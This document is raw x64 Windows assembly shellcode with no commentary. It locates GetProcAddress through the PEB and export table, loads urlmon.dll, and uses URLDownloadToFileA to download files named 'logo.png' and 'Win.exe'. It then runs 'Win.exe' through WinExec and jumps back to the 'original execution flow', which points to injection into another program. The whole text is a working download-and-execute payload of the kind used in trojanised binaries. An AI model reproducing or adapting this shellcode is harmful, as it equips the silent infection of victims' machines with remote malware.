push rbp
push rdi
sub rsp, 0E8h
lea rbp;[rsp+20h]
xor rax, rax
mov rcx, gs:[rax+0x60h] ;PEB
mov rcx, [rcx+18h]
mov rcx, [rcx+20h]
mov rcx, [rcx]
mov rcx, [rcx]
mov rcx, [rcx+20h]
mov eax, [rcx+3Ch] ;NtHeader
add rax, rcx
lea rax, [rax+18h]
lea rax, [rax+70h]
lea rax, [rax]
mov edx, [rax]
lea rax, [rcx+rdx]
mov edx, [rax+18h]
mov r8d, [rax+20h]
lea r8, [rcx+r8]
mov r10, 41636F7250746547h
mov r11, 73736572646441h	;"GetProcAddress"
loc_1:
	mov r9d, [r8]
	lea r9, [rcx+r9]
	cmp r10, [r9]
	jnz loc_2 
	cmp r11, [r9+7]
	jnz loc_2
	neg rdx
	mov r10d, [rax+18h]
	lea rdx, [r10+rdx]
	mov r10d, [rax+24h]
	lea r10, [rcx+r10]
	movzx rdx, word ptr [r10+rdx*2]
	mov r10d, [rax+1Ch]
	lea r10, [rcx+r10]
	mov r10d, [r10+rdx*4]
	lea rax, [rcx+r10]
	jmp loc_3
loc_2:
	add r8,4
	dec rdx
	jnz loc_1
loc_3:
	push rcx
	push rax
	push r15
	push 0
	push 41797261h
	mov rbx, 7262694C64616F4Ch	;LoadLibraryA
	push rbx
	mov rdx, rsp
	call rax	;GetProcAddress(LoadLibraryA)
	add rsp, 20h
	pop r11
	pop r10
	push r10
	push r11
	push 0
	mov ebx, 6C6Ch
	push rbx
	mov rbx, 642E6E6F6D6C7275h ;"urlmon.dll"
	push rbx
	mov rcx, rsp
	sub rsp, 18h
	call rax	;LoadLibraryA(urlmon.dll)
	add rsp, 30h
	pop r11
	pop r10
	push r10
	push r10
	push 0
	push 4165h
	mov rbx, 6C69466F5464616Fh
	push rbx
	mov rbx, 6C6E776F444C5255h
	push rbx	;"URLDownloadToFileA"
	mov rdx, rsp
	mov rcx, rax
	mov rax, r11
	sub rsp, 20
	call rax
	mov r14, rax
	add rsp, 40h
	pop r11
	pop r10
	push r10
	push r11
	xor rcx, rcx
	jmp loc_4
loc_5:
	var_18 = qword ptr -18h
	pop rdx
	add rdx, 06Ah
	jmp loc_6
loc_4:
	call loc_5
loc_6:
	push 0
	mov rbx, 676E702E6F676F6Ch
	push rbx
	mov r8, rsp
	mov r15, r8
	mov r9, rcx
	sub rsp, 30h
	mov [rsp+38h+var_18], rcx
	call rax
	add rsp, 40h
	xor rcx, rcx
	jmp loc_8
loc_7:
	var_18 = qword ptr -18h
	pop rdx
	jmp loc_9
loc_8:
	call loc_7
loc_9:
	push 0
	mov rbx, 6578652E6E6957h
	push rbx
	mov r8, rsp
	mov r15, r8
	mov r9, rcx
	sub rsp, 30h
	mov [rsp+38h+var_18], rcx
	mov rax, r14
	call rax
	add rsp, 40h
	pop r11
	pop r10
	push 0
	mov rbx, 636578456E6957h
	push rbx
	mov rdx, rsp
	mov rcx, r10
	mov rax, r11
	call rax
	push 0
	mov rbx, 6578652E6E6957h
	push rbx
	mov rcx, rsp
	mov rdx, 1
	call rax
	add rsp, 108h
	pop rdi
	pop rbp
	jmp original_execution_flow
	
	
	
	
	
	
	